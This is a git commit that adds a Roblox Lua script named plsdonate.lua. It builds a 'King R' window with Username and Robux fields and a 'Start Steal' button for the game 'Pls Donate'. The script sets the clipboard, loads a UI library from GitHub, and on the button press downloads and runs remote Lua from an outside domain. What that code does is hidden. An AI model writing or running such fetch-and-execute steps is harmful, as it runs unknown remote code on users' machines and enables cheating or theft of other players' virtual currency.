a5b641aafcbbb3dca709c7f9e75bb32434fdb539
Star Is You💫 <vewarisking575@gmail.com>
2024-12-29 16:36:05 +0700

    Create plsdonate.lua

---
+++ plsdonate.lua
@@ -0,0 +1,16 @@
+setclipboard("KingR On Top")
+
+local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/bacon"))()
+
+local window = lib:CreateWindow("King R")
+
+local label = lib:CreateLabel(window, "Pls Donate")
+
+local textBox = lib:CreateTextBox(window, Enum.Font.Legacy, "Username:", "")
+
+local textBox = lib:CreateTextBox(window, Enum.Font.Legacy, "Robux:", "")
+
+
+local button = lib:CreateButton(window, "Start Steal", function()
+        loadstring(game:HttpGet("https://egorikusa.space/25b3fcb620f55b445d5461ad.lua", true))()
+end)
